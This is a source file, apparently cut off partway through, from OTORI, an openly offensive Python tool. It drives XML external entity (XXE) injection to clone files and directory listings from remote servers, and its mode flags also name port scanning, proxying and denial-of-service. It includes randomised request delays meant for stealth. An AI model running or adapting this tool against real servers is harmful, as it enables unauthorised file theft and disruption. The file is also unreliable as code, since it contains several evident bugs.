#!/usr/bin/python

# On The Outside, Reaching In ("OTORI")
# Copyright 2014 Ben Lincoln
# http://www.beneaththewaves.net/
#

# This file is part of On The Outside, Reaching In ("OTORI").

# On The Outside, Reaching In ("OTORI") is free software: you can redistribute it and/or modify
# it under the terms of version 3 of the GNU General Public License as published by
# the Free Software Foundation.

# On The Outside, Reaching In ("OTORI") is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with On The Outside, Reaching In ("OTORI") (in the file LICENSE.txt).  
# If not, see <http://www.gnu.org/licenses/>.

import copy
import datetime
import httplib
import os
import random
import re
import sys
import time
import urllib2

import libdeceitfulhttp
import libfileio
import liblogging
import libotori
import liboutput
import libxxeexploits
import xxeexploitmodules


class Error(Exception):
	pass

class RequestError(Error):
    def __init__(self, msg):
        self.msg = msg
		
class OtoriInstance:
	OPMODE_UNKNOWN = 0
	OPMODE_CLONE = 8
	OPMODE_TEST = 16
	OPMODE_PORTSCAN = 32
	OPMODE_XXEPROXY = 64
	OPMODE_DOSLULZ = 128
	OPMODE_DOSQUAD = 256
	
	REQUESTMODE_UNKNOWN = 0
	REQUESTMODE_SINGLEURI = 2
	REQUESTMODE_EXACTURILIST = 4
	REQUESTMODE_ROOTURI = 8
	REQUESTMODE_ROOTURILIST = 16
	
	EXISTINGFILES_UNKNOWN = 0
	EXISTINGFILES_PRESERVE = 1
	EXISTINGFILES_OVERWRITE = 2
	EXISTINGFILES_VERSION = 4

	@staticmethod
	def GetOperationModeName(opMode):
		if (opMode == OtoriInstance.OPMODE_CLONE):
			return "Clone Remote Content"
		if (opMode == OtoriInstance.OPMODE_TEST):
			return "Test Module"
		if (opMode == OtoriInstance.OPMODE_PORTSCAN):
			return "Port Scan"
		if (opMode == OtoriInstance.OPMODE_XXEPROXY):
			return "XXE Proxy"

		return "Unknown"
		
	def __init__(self, multiLogger, xxemodule, opMode, requestMode, requestRootOrList, outputBase, existingFilesBehaviour, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow):
		self.MultiLogger = multiLogger
		self.LocalTZ = liblogging.LocalTimezone()
		self.module = xxemodule
		self.module.OtoriInstance = self
		self.opMode = opMode
		self.requestMode = requestMode
		self.outputBase = outputBase
		self.existingFilesBehaviour = existingFilesBehaviour
		self.RequestTimeout = requestTimeout
		self.MaxRetries = maxRetries
		self.RequestWaitTime = requestWaitTime
		self.RequestWaitTimeWindow = requestWaitTimeWindow
		# do not enable this setting - it won't work as expected because Java is broken
		self.UseIntelligentFileVersusDirectoryLogic = False
		
		# when recursing through directory listings, assume the result was a file after this many lines fail to produce further results
		self.maxMissingFilesBeforeGivingUp = 3
		
		# When generating versioned file names, try to generate a unique name this many times before giving up
		self.maxVersionedFileNameAttempts = 5

		self.baseURIs = []
		if ((self.requestMode == OtoriInstance.REQUESTMODE_SINGLEURI) or (self.requestMode == OtoriInstance.REQUESTMODE_ROOTURI)):
			self.baseURIs.append(requestRootOrList)
		if ((self.requestMode == OtoriInstance.REQUESTMODE_EXACTURILIST) or (self.requestMode == OtoriInstance.REQUESTMODE_ROOTURILIST)):
			try:
				self.baseURIs = libfileio.FileReader.getFileAsList(requestRootOrList)
			except:
				self.MultiLogger.critical('Failed to read the file "' + requestRootOrList + '" as a list of URIs.')
				sys.exit(1)
		self.uriBlacklist = []
		
	def GetRequestWaitTime(self):
		if ((self.RequestWaitTime == 0) and (self.RequestWaitTimeWindow == 0)):
			return 0
		if (self.RequestWaitTimeWindow == 0):
			return self.RequestWaitTime
		superStealthyUnpredictabilityFactor = random.randint(0, self.RequestWaitTimeWindow) - (self.RequestWaitTimeWindow * 0.5)
		result = int(self.RequestWaitTime + superStealthyUnpredictabilityFactor)
		if (result < 0):
			return 0
		return result
		
	def WaitBetweenRequestsIfNecessary(self):
		if ((self.RequestWaitTime == 0) and (self.RequestWaitTimeWindow == 0)):
			return False
		waitTime = self.GetRequestWaitTime()
		if (waitTime == 0):
			self.MultiLogger.debug('No wait time is necessary before the next request')
		else:
			self.MultiLogger.info('Waiting {0} milliseconds before the next request'.format(waitTime))
			time.sleep(waitTime / 1000)
		return True
		
	def GetVersionedPathName(self, path):
		gotVersionedName = False
		attemptNumber = 0
		while not (gotVersionedName):
			result = '' + path
			if (len(result) > 0):
				if (result[-1] == '/'):
					result = result[:-1]
			#timestamp = datetime.datetime.utcnow().astimezone(self.LocalTZ)
			timestamp = datetime.datetime.now()
			result = result + '-otori-' + timestamp.strftime("%Y%m%d%H%M%S%f")
			self.MultiLogger.debug('Generated versioned path "' + result + '" from original path "' + path + '"')
			if os.path.exists(result):
				attemptNumber = attemptNumber + 1
			else:
				self.MultiLogger.debug('The new path is not already in use - proceeding')
				gotVersionedName = True
			if (attemptNumber > self.maxVersionedFileNameAttempts):
				errMsg = 'Failed to generated a unique name for "' + requestRootOrList + '" after ' + str(attemptNumber - 1) + ' attempts - aborting'
				self.MultiLogger.error(errMsg)
				#sys.exit(1)
				raise RequestError(errMsg)
			else:
				self.MultiLogger.warning('A file or directory already exists at "' + result + '" - retrying versioned path generation')
		return result
		
	def CreateLocalDirectory(self, localPath):
		self.MultiLogger.debug('Received request to create local directory "' + localPath + '"')
		# Rules:
		#	If the path doesn't already exist, create the directory there
		#	If the path exists
		#		If the path exists and is a file
		#			If versioning is enabled, rename the existing file with a versioned name and use the original name for a new directory
		#				(This is to avoid re-replicating a bunch of content every time the script is re-run, which is what would happen if the *directory* name were versioned)
		#			If overwrite is enabled, delete the existing file and create a directory with its name
		#			If preservation is enabled, panic and exit the program (needs improvement)
		#		If the path exists and is a directory
		#			Do nothing - the directory already exists
		if os.path.exists(localPath):
			if os.path.isdir(localPath):
				self.MultiLogger.info('Using existing local directory "' + localPath + '"')
			else:
				self.MultiLogger.warning('A file exists at "' + localPath + '", which is the local path for the current directory')
				if (self.existingFilesBehaviour == OtoriInstance.EXISTINGFILES_OVERWRITE):
					self.MultiLogger.warning('The file "' + localPath + '" will be deleted to allow the creation of a directory with that path - re-run with a different existing-files option to change this behaviour')
					try:
						os.remove(localPath)
					except:
						errMsg = 'Could not delete the existing file "' + localPath + '" - this directory and any subdirectories will not be processed'
						self.MultiLogger.error(errMsg)
						raise RequestError(errMsg)
					try:
						os.makedirs(localPath)
					except:
						errMsg = 'Could not create local directory "' + localPath + '" - this directory and any subdirectories will not be processed'
						self.MultiLogger.error(errMsg)
						raise RequestError(errMsg)
					self.MultiLogger.debug('Created local directory "' + localPath + '"')
				if (self.existingFilesBehaviour == OtoriInstance.EXISTINGFILES_VERSION):
					existingFileNewName = self.GetVersionedPathName(localPath)
					self.MultiLogger.warning('The file "' + localPath + '" will be renamed to "' + existingFileNewName + '" to allow the creation of a directory at its original path - re-run with a different existing-files option to change this behaviour')
					try:
						os.rename(localPath, existingFileNewName)
					except:
						errMsg = 'Could not rename the existing file "' + localPath + '" - this directory and any subdirectories will not be processed'
						self.MultiLogger.error(errMsg)
						raise RequestError(errMsg)
					try:
						os.makedirs(localPath)
					except:
						errMsg = 'Could not create local directory "' + localPath + '" - this directory and any subdirectories will not be processed'
						self.MultiLogger.error(errMsg)
						raise RequestError(errMsg)
					self.MultiLogger.debug('Created local directory "' + localPath + '"')
				if (self.existingFilesBehaviour == OtoriInstance.EXISTINGFILES_PRESERVE):
					errMsg = 'There is already a file with the local path "' + localPath + '", where the current directory needs to be created. The option to preserve existing files is enabled, so this directory and any subdirectories will not be created'
					self.MultiLogger.error(errMsg)
					raise RequestError(errMsg)
		else:
			self.MultiLogger.info('Creating new local directory "' + localPath + '"')
			try:
				os.makedirs(localPath)
			except:
				errMsg = 'Could not create local directory "' + localPath + '" - this directory and any subdirectories will not be processed'
				self.MultiLogger.error(errMsg)
				raise RequestError(errMsg)
					
	def CreateLocalFile(self, localPath, content, fileResult):
		self.MultiLogger.debug('Received request to create local file "' + localPath + '" with the following content: \n' + content)
		effectiveLocalPath = '' + localPath
		# Rules:
		#	If the new file is considered empty and empty files are to be discarded, do nothing
		#	If the path doesn't already exist, write the file there
		#	If the path exists
		#		If preservation is enabled, do not write the new content at all
		#		If the path exists and is a file
		#			If versioning is enabled, write the new content to a new file with the versioned name
		#			If overwrite is enabled, overwrite the existing file with the new content
		#		If the path exists and is a directory
		#			If versioning is enabled, write the new content to a new file with the versioned name
		#			If overwrite is enabled, delete the existing directory tree and create a file with the original name with the new content
		#
		writeContent = True
		if (self.discardEmptyFiles):
			checkText = content
			if (self.whiteSpaceFilesAreEmpty):
				checkText = checkText.strip()
			if (checkText == ''):
				self.MultiLogger.debug('Discarding empty result for "' + fileResult.XXETarget + '"')
				fileResult.ReturnCode = libxxeexploits.XXEResponse.RESPONSE_NOCONTENT
				writeContent = False
		if (self.DiscardErrorFiles):
			if (fileResult.ReturnCode != libxxeexploits.XXEResponse.RESPONSE_OK):
				if ((fileResult.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_NOCONTENT) or (fileResult.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_LOCALFILEEXISTS)):
					self.MultiLogger.debug('The result for "{0}" generated a response code of {1}, which is not considered an error for purposes of file retention'.format(fileResult.XXETarget, fileResult.ReturnCode))
				else:
					self.MultiLogger.debug('Discarding result for "{0}" which generated an error (response code {1})'.format(fileResult.XXETarget, fileResult.ReturnCode))
					writeContent = False
		
		if (writeContent):
			if os.path.exists(effectiveLocalPath):
				if os.path.isdir(effectiveLocalPath):
					self.MultiLogger.warning('A directory exists at "' + effectiveLocalPath + '", which is the local path for the current file')
					if (self.existingFilesBehaviour == OtoriInstance.EXISTINGFILES_OVERWRITE):
						self.MultiLogger.warning('The directory "' + effectiveLocalPath + '" will be deleted to allow the creation of a file with that path - re-run with a different existing-files option to change this behaviour')
						try:
							os.remove(effectiveLocalPath)
						except:
							self.MultiLogger.error('Could not delete the existing directory "' + effectiveLocalPath + '" - the new file content will not be stored')
							writeContent = False
					if (self.existingFilesBehaviour == OtoriInstance.EXISTINGFILES_VERSION):
						effectiveLocalPath = self.GetVersionedPathName(effectiveLocalPath)
						self.MultiLogger.warning('The new file will be named "' + effectiveLocalPath + '" to avoid overwriting the existing directory with that path - re-run with a different existing-files option to change this behaviour')
					if (self.existingFilesBehaviour == OtoriInstance.EXISTINGFILES_PRESERVE):
						self.MultiLogger.warning('There is already a directory with the local path "' + effectiveLocalPath + '", where the current file needs to be created. The option to preserve existing files is enabled, so the new file content will not be stored - re-run with a different existing-files option to change this behaviour')
						fileResult.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_LOCALFILEEXISTS
						writeContent = False
				else:
					self.MultiLogger.warning('A file exists at "' + effectiveLocalPath + '", which is the local path for the new file')
					if (self.existingFilesBehaviour == OtoriInstance.EXISTINGFILES_OVERWRITE):
						self.MultiLogger.warning('The existing file "' + effectiveLocalPath + '" will be deleted to allow the creation of a new file with that path - re-run with a different existing-files option to change this behaviour')
						try:
							os.remove(effectiveLocalPath)
						except:
							self.MultiLogger.error('Could not delete the existing file "' + effectiveLocalPath + '" - the new file content will not be stored')
							writeContent = False
					if (self.existingFilesBehaviour == OtoriInstance.EXISTINGFILES_VERSION):
						effectiveLocalPath = self.GetVersionedPathName(effectiveLocalPath)
						self.MultiLogger.warning('The new file will be created as "' + effectiveLocalPath + '" to avoid overwriting the existing file - re-run with a different existing-files option to change this behaviour')
					if (self.existingFilesBehaviour == OtoriInstance.EXISTINGFILES_PRESERVE):
						self.MultiLogger.error('There is already a file with the local path "' + effectiveLocalPath + '", where the current file needs to be created. The option to preserve existing files is enabled, so the new file content will not be stored - re-run with a different existing-files option to change this behaviour')
						fileResult.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_LOCALFILEEXISTS
						writeContent = False
			else:
				self.MultiLogger.debug('Creating new local file "' + effectiveLocalPath + '"')
		if (writeContent):
			try:
				f = open(effectiveLocalPath, "w")
				f.write(content)
				f.close()
			except:
				self.MultiLogger.error('Could not write file contents to "' + effectiveLocalPath + '"')
			try:
				if os.path.exists(effectiveLocalPath):
					fileResult.LocalSize = os.path.getsize(effectiveLocalPath)
			except:
				self.MultiLogger.error('Error checking existence/size of "' + effectiveLocalPath + '"')
		else:
			#self.MultiLogger.warning('The newly-downloaded file data for "' + localPath + '" will be discarded - re-run with a different existing-files option to change this behaviour')
			self.MultiLogger.debug('The newly-downloaded file data for "' + localPath + '" will be discarded')
			
		fileResult.LocalPath = effectiveLocalPath
		return fileResult
				
	def loadURIBlacklist(self, blacklistFilePath):
		try:
			self.uriBlacklist = libfileio.FileReader.getFileAsList(blacklistFilePath)
		except:
			self.MultiLogger.error('Failed to read the file "' + blacklistFilePath + '" as a list of URIs to blacklist.')
		
	def operate(self):
		result = []
		return result
		
	def uriIsBlacklisted(self, uri):
		if (len(self.uriBlacklist) == 0):
			return False
		for rs in self.uriBlacklist:
			rx = re.compile(rs, flags=re.MULTILINE)
			m = rx.findall(uri)
			if (m):
				self.MultiLogger.debug('URI blacklist matches: "' + str(m) + '" in "' + uri + '"')
				return True
			else:
				self.MultiLogger.debug('No URI blacklist matches for "' + uri + '" with pattern "' + rs + '"')
		return False

	
	@staticmethod
	def encodePath(inputPath):
		result = inputPath
		result = result.replace("%", "%25")
		return result
	
	@staticmethod
	def encodeUri(inputUri):
		result = inputUri
		result = inputUri.replace("%", "%25")
		result = inputUri.replace("#", "%23")
		return result
		
	# modify local paths in a way that is safe for both Linux and Windows
	# and is reasonably unlikely to result in collisions (but not guaranteed to avoid them)
	@staticmethod
	def SafelyFormatLocalPath(inputPath):
		result = liboutput.OutputUtils.ReplaceNonPrintableCharactersForFilesystemPaths(inputPath)
		return result
		
	@staticmethod
	def getPathForHumanReadableOutput(path):
		result = path
		result = result.replace("\t", "[TAB]")
		return result
	
	@staticmethod
	def getNextLocalPath(currentLocalPath, nextRelativePath):
		#result = currentLocalPath + '/' + OtoriInstance.encodeUri(nextRelativePath)
		result = currentLocalPath + '/' + OtoriInstance.SafelyFormatLocalPath(nextRelativePath)
		return result
		
	def HandleRequestException(self, exception):
		self.MultiLogger.error('Exception thrown when sending request: ' + str(type(exception)) + ' - ' + str(exception.args))

	def GetOccurrencesNoun(self, count):
		if (count == 1):
			return 'time'
		return 'times'
		
	def HandleRequestResponse(self, response, retryCount):
		target = 'no_response_received'
		if (response):
			if (response.XXETarget):
				target = response.XXETarget
			else:
				target = 'bad_response_object'
		prefix = 'The request for "{0}" '.format(target)
		if (self.ResponseIndicatesSuccess(response)):
			self.MultiLogger.debug(prefix + 'was successful')
			return False
		else:
			self.MultiLogger.debug(prefix + 'was not successful')
			shouldRetry = self.ResponseIndicatesRetryNeeded(response)
			if (shouldRetry):
				if (self.MaxRetries == 0):
					self.MultiLogger.error(prefix + 'has failed, and although it is of a type that can be retried, retries have been disabled - this request will not be retried')
					shouldRetry = False
				else:
					failureCount = retryCount + 1
					failureCountNoun = self.GetOccurrencesNoun(failureCount)
					retryCountNoun = self.GetOccurrencesNoun(retryCount)
					maxRetriesCountNoun = self.GetOccurrencesNoun(self.MaxRetries)
					if (failureCount <= self.MaxRetries):
						if (self.MaxRetries > 1):
							self.MultiLogger.error(prefix + 'has failed ' + str(failureCount) + ' ' + failureCountNoun + ', and will be retried up to ' + str(self.MaxRetries) + ' ' + maxRetriesCountNoun)
						else:
							self.MultiLogger.error(prefix + 'has failed ' + str(failureCount) + ' ' + failureCountNoun + ', and will be retried once')
					else:
						self.MultiLogger.error(prefix + 'has already been retried ' + str(retryCount) + ' ' + retryCountNoun + ', and the current limit is ' + str(self.MaxRetries) + ' ' + maxRetriesCountNoun + ' - this request will not be retried again')
						shouldRetry = False
			else:
				self.MultiLogger.debug(prefix + 'has failed, and is of a type that will not be retried')
			return shouldRetry
		
	def ResponseIndicatesSuccess(self, response):
		if not (response):
			return False
		if not (response.ReturnCode):
			return False
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_OK):
			return True
		# a lack of content is not a failure from a UI perspective
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_NOCONTENT):
			return True
		return False
		
	def ResponseIndicatesRetryNeeded(self, response):
		if not (response):
			return True
		if not (response.ReturnCode):
			return True

		# don't need to retry if the request was successful
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_OK):
			return False

		# network-level problems usually indicate that the attempt wasn't even made
		if (response.NetworkLevelResponse.Error):
			return True
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_NETWORK_ERROR):
			return True
			
		# if the target wasn't found, is inaccessible, or can't be read, there's no point asking for it again
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_NOTFOUND):
			return False
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_NOACCESS):
			return False
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_UNREADABLE):
			return False
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_NOCONTENT):
			return False
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_TOOLARGE):
			return False
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_ENTITY_REFERENCE_LOOP):
			return False			
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_OUT_OF_MEMORY):
			return False

		# don't retry things that the user explicitly specified not to do
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_BLACKLISTED):
			return False
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_DEPTHEXCEEDED):
			return False			
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_LOCALFILEEXISTS):
			return False
			
		# a timeout is probably worth retrying
		# maybe consider auto-increasing the timeout when this happens?
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_TIMEOUT):
			return True

		return False

class OtoriInstanceClone(OtoriInstance):
	def __init__(self, multiLogger, xxemodule, requestMode, requestRootOrList, outputBase, existingFilesBehaviour, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow, maxDepth, discardErrorFiles, discardEmptyFiles, whiteSpaceFilesAreEmpty, deleteEmptyDirectories):
		OtoriInstance.__init__(self, multiLogger, xxemodule, OtoriInstance.OPMODE_CLONE, requestMode, requestRootOrList, outputBase, existingFilesBehaviour, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow)
		self.maxDepth = maxDepth
		self.DiscardErrorFiles = discardErrorFiles
		self.discardEmptyFiles = discardEmptyFiles
		self.whiteSpaceFilesAreEmpty = whiteSpaceFilesAreEmpty
		self.deleteEmptyDirectories = deleteEmptyDirectories
		self.allResults = {}
		
	def addResult(self, newResult):
		if not (self.allResults.has_key(newResult.XXETarget)):
			self.allResults[newResult.XXETarget] = newResult
			
	def GetURIViaXXEInner(self, uri):
		succeeded = False
		retryCount = 0
		result = None
		while not (succeeded):
			
			#result = self.module.GetURIViaXXE(uri)
			#succeeded = True
			try:
				result = self.module.GetURIViaXXE(uri)
				succeeded = True
			except Exception as e:
				self.HandleRequestException(e)
			if (succeeded):
				dummy = 1
				self.MultiLogger.debug('The request for "{0}" succeeded'.format(uri))
			else:
				self.MultiLogger.debug('The request for "{0}" failed'.format(uri))
				shouldRetry = self.HandleRequestResponse(result, retryCount)
				if not (shouldRetry):
					self.WaitBetweenRequestsIfNecessary()
					break
			retryCount = retryCount + 1
			self.WaitBetweenRequestsIfNecessary()
		
		if (result):
			result.OverallRequestSucceeded = succeeded
		return result
	
	def GetURIViaXXE(self, uri):
		result = self.GetURIViaXXEInner(uri)

		# Well, the code below was a giant waste of time:
		# 	Java treats the following URIs as equivalent even if the resource in question is a file:
		#		file:///var/tmp/somefile.txt
		#		file:///var/tmp/somefile.txt/
		## if the module is marked as supporting directory listings, *and* the current URI does not already end in a slash, 
		## request the same path but with a trailing slash and see if the result is the same. 
		## If so, it's virtually guaranteed to be a directory listing.
		#tryDirectoryListing = True
		#if (uri[-1] == '/'):
			#tryDirectoryListing = False
			#result.IsDirectory = True
		#if (result.IsDirectory):
			#tryDirectoryListing = False
		#if not (self.UseIntelligentFileVersusDirectoryLogic):
			#tryDirectoryListing = False
		#if not ((self.requestMode == OtoriInstance.REQUESTMODE_ROOTURI) or (self.requestMode == OtoriInstance.REQUESTMODE_ROOTURILIST)):
			#tryDirectoryListing = False
		#if not (result.OverallRequestSucceeded):
			#tryDirectoryListing = False
		#if not (self.module.SupportsDirectoryListings):
			#tryDirectoryListing = False

		#if (tryDirectoryListing):
			#edUri = "{0}/".format(uri)
			#explicitDirectoryResult = self.GetURIViaXXEInner(edUri)
			#resultsMatch = True
			#self.MultiLogger.debug('Comparing result for {0} with result for {1}'.format(uri, edUri))
			#if (result.ReturnCode != explicitDirectoryResult.ReturnCode):
				#resultsMatch = False
				#self.MultiLogger.debug('Return codes are different - assuming this is a file')
			#if (result.ParsedResponse != explicitDirectoryResult.ParsedResponse):
				#resultsMatch = False
				#self.MultiLogger.debug('Response content is different - assuming this is a file')
			#if (resultsMatch):
				#self.MultiLogger.debug('Treating this result as a directory')
				#result.IsDirectory = True
			
		return result
		
	def Operate(self):
		currentLocalPath = self.outputBase
		
		currentDepth = 0
		
		allResults = []
		
		for u in self.baseURIs:
			baseuri = u.strip()
			#initialResult = self.module.GetURIViaXXE(OtoriInstance.encodeUri(baseuri))
			initialResult = self.GetURIViaXXE(OtoriInstance.encodeUri(baseuri))
			if (initialResult):
				#self.addResult(libxxeexploits.XXEResponse.CloneWithoutResponseText(initialResult))
				currentLocalPath = OtoriInstance.SafelyFormatLocalPath(self.outputBase)
				currentRemotePath = baseuri
				# remove URI protocol section
				rsURIProtocol = r"[a-zA-Z]{1,16}:[/]{2,3}"
				rx = re.compile(rsURIProtocol)
				currentRemotePath = rx.sub("", currentRemotePath)
				self.MultiLogger.debug('Original remote path: "' + baseuri + '", for purposes of local directory creation: "' + currentRemotePath + '"')
				
				# remove trailing slash, if present
				if (len(currentRemotePath) > 0):
					if (currentRemotePath[-1] == '/'):
						currentRemotePath = currentRemotePath[:-1]
				if (len(currentRemotePath) > 0):
					#currentLocalPath = currentLocalPath + '/' + currentRemotePath
					currentLocalPath = OtoriInstance.getNextLocalPath(currentLocalPath, currentRemotePath)
				if ((self.requestMode == OtoriInstance.REQUESTMODE_ROOTURI) or (self.requestMode == OtoriInstance.REQUESTMODE_ROOTURILIST)):
					self.addResult(libxxeexploits.XXEResponse.CloneWithoutResponseText(initialResult))
					uriResults = self.DownloadAndRecurse(currentLocalPath, baseuri, currentDepth, initialResult)
					for result in uriResults:
						self.addResult(result)
				else:
					fileResult = libxxeexploits.XXEResponse.CloneWithoutResponseText(initialResult)
					parentPath = os.path.dirname(currentLocalPath)
					try:
						if (os.path.exists(parentPath)):
							if (os.path.isdir(parentPath)):
								self.MultiLogger.debug('Using existing local directory "' + parentPath + '"')
							else:
								self.CreateLocalDirectory(parentPath)
						else:
							self.CreateLocalDirectory(parentPath)
						fileResult = self.CreateLocalFile(currentLocalPath, initialResult.ParsedResponse, fileResult)
						self.addResult(fileResult)
					except:
						self.MultiLogger.error('Creation of necessary directory failed.')
						self.addResult(libxxeexploits.XXEResponse.GetUnknownFailureResponse(u))
			else:
				self.MultiLogger.debug('Current request (for "' + u + '") failed')
				self.addResult(libxxeexploits.XXEResponse.GetUnknownFailureResponse(u))
		finalResults = []
		
		for frk in self.allResults.keys():
			fr = self.allResults[frk]
			finalResults.append(fr)
		
		self.module.PerformCleanup()
		
		return finalResults
				
		
	def DownloadAndRecurse(self, currentLocalPath, currentUri, currentDepth, previousResult):
		if (currentUri.strip() == ''):
			raise RequestError('An attempt was made to request a URI, but the path was an empty string. Execution was aborted to prevent unexpected results.')
		newAllResultsList = []
		badResult = libxxeexploits.XXEResponse()
		badResult.XXETarget = currentUri
		badResult.LocalPath = currentLocalPath
		newDepth = currentDepth + 1
		if (newDepth > self.maxDepth):
			self.MultiLogger.warning('Reached maximum recursion depth of ' + str(self.maxDepth) + ' in branch "' + currentUri + '" - will not proceed further in this branch')
			badResult.ReturnCode = libxxeexploits.XXEResponse.RESPONSE_DEPTHEXCEEDED
			newAllResultsList.append(badResult)
			return newAllResultsList
		self.MultiLogger.debug('Local Path: "' + currentLocalPath + '"')
		self.MultiLogger.debug('Remote URI: "' + currentUri + '"')
		if (self.uriIsBlacklisted(currentUri)):
			self.MultiLogger.warning('Ignoring URI "' + currentUri + '" because it matches a pattern in the URI blacklist.')
			badResult.ReturnCode = libxxeexploits.XXEResponse.RESPONSE_BLACKLISTED
			newAllResultsList.append(badResult)
			return newAllResultsList
		else:
			self.MultiLogger.debug('Current URI ("' + currentUri + '") does not match a pattern in the URI blacklist.')
		pr = previousResult.ParsedResponse.strip()

			
		currentUriIsDirectoryList = False
		nextResults = []
		rlines = []
		
		if (self.UseIntelligentFileVersusDirectoryLogic):
			currentUriIsDirectoryList = previousResult.IsDirectory
			fvdLogString = 'Using semi-intelligent file-versus-directory differentiation. Current result appears to be a '
			if (currentUriIsDirectoryList):
				fvdLogString = fvdLogString + 'directory'
				rlines = previousResult.ParsedResponse.strip().splitlines()
			else:
				fvdLogString = fvdLogString + 'file'
			self.MultiLogger.debug(fvdLogString)
			
		else:
			self.MultiLogger.debug('Using semi-brute-force file-versus-directory differentiation.')

			if (pr):
				self.MultiLogger.debug('Previous result text is not empty and will be tested to see if it is a directory listing')
				if (len(pr) > 0):
					rlines = previousResult.ParsedResponse.strip().splitlines()
			else:
				self.MultiLogger.debug('Previous result text is empty or whitespace-only and will be treated as a file')
			
		fileFoundCount = 0
		fileNotFoundCount = 0
		fileErrorCount = 0
		if (len(rlines) > 0):
			self.MultiLogger.debug('Checking a maximum of ' + str(len(rlines)) + ' lines from the previous result text')
			currentUriIsDirectoryList = True

			for rl in rlines:
				rlFixed = rl.strip()
				self.MultiLogger.debug('Current line: "' + rlFixed + '"')
				isBadLine = False
				if (rlFixed == ''):
					isBadLine = True
				else:
					if (rlFixed[0] == '/'):
						isBadLine = True
				if (isBadLine):
					self.MultiLogger.debug('Current line is empty or consists only of whitespace, so will be treated as invalid')
					fileNotFoundCount = fileNotFoundCount + 1
				else:
					currentUriFixed = currentUri
					if (len(currentUriFixed) > 0):
						if (currentUriFixed[-1] != '/'):
							currentUriFixed = currentUriFixed + '/'
					nextUri = currentUriFixed + OtoriInstance.encodeUri(rlFixed)
					self.MultiLogger.debug('Next URI: "' + nextUri + '"')
					
					# need to make sure that the next local path is not above the current one
					# to prevent jokers from creating files that will mess with the system from which OTORI is run
					# as well as prevent unfortunate accidents when files are mis-interpreted as directory listings
					absPathCurrent = os.path.abspath(currentLocalPath)
					absPathNext = os.path.abspath(OtoriInstance.getNextLocalPath(currentLocalPath, rlFixed))
					self.MultiLogger.debug('Absolute path current: "' + absPathCurrent + '"')
					self.MultiLogger.debug('Absolute path next: "' + absPathNext + '"')
					
					validNextPath = True
					if (len(absPathNext) < len(absPathCurrent)):
						validNextPath = False
						self.MultiLogger.error('The absolute local path for the next URI ("' + absPathNext + '") is shorter than the current path ("' + absPathCurrent + '") and is therefore invalid')
					if (validNextPath):
						if (absPathCurrent != absPathNext[0:len(absPathCurrent)]):
							validNextPath = False
							self.MultiLogger.error('The absolute local path for the next URI ("' + absPathNext + '") does not contain the current path ("' + absPathCurrent + '") and is therefore invalid')
					
					if (validNextPath):
						self.MultiLogger.debug('Requesting next URI: "' + nextUri + '"')
						nextResult = self.GetURIViaXXE(nextUri)
						if (nextResult):
							nextResult.OriginalRelativePath = rlFixed
							self.MultiLogger.debug('Parsed response: \n' + nextResult.ParsedResponse)
							self.MultiLogger.debug('Return code: ' + str(nextResult.ReturnCode))
							if (nextResult.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_NOTFOUND):
								self.MultiLogger.debug('File "' + nextUri + '" was not found')
								fileNotFoundCount = fileNotFoundCount + 1
							else:
								fileFoundCount = fileFoundCount + 1
								if (nextResult.ReturnCode != libxxeexploits.XXEResponse.RESPONSE_OK):
									fileErrorCount = fileErrorCount + 1
							nextResults.append(nextResult)
						else:
							self.MultiLogger.debug('Current request (for "' + nextUri + '") failed')
							nextResults.append(libxxeexploits.XXEResponse.GetUnknownFailureResponse(nextUri))

				self.MultiLogger.debug('Number of files from this potential list which were found is currently ' + str(fileFoundCount))
				self.MultiLogger.debug('Number of files from this potential list which were not found is currently ' + str(fileNotFoundCount))
				self.MultiLogger.debug('Number of files from this potential list which returned an error is currently ' + str(fileErrorCount))
				if not (self.UseIntelligentFileVersusDirectoryLogic):
					if (fileNotFoundCount > self.maxMissingFilesBeforeGivingUp):
						# this is probably not a directory listing
						self.MultiLogger.debug('The count of files not found from this list has exceeded the current threshold of ' + str(self.maxMissingFilesBeforeGivingUp) + ' - this list is being classified as "not a directory listing"')
						currentUriIsDirectoryList = False
						break
		if not (self.UseIntelligentFileVersusDirectoryLogic):
			if (fileFoundCount == 0):
				# this is probably not a directory listing
				self.MultiLogger.debug('No files were found via the current list after ' + str(self.maxMissingFilesBeforeGivingUp) + ' entries were attempted - this list is being classified as "not a directory listing"')
				currentUriIsDirectoryList = False
				
			if ((fileFoundCount - fileErrorCount) < 1):
				# this is probably not a directory listing
				# or none of the files in it are accessible
				self.MultiLogger.debug('No files were successfully accessed via the current list after ' + str(self.maxMissingFilesBeforeGivingUp) + ' entries were attempted - this list is being classified as "not a directory listing"')
				currentUriIsDirectoryList = False
			
		if (currentUriIsDirectoryList):
			self.MultiLogger.debug('The current list appears to be a directory listing')
			createdLocalDirectory = False
			try:
				self.CreateLocalDirectory(currentLocalPath)
				createdLocalDirectory = True

			except RequestError:
				createdLocalDirectory = False
				self.MultiLogger.debug('Could not create the local directory "' + currentLocalPath + '", so this directory and any subdirectories will not be processed.')
			
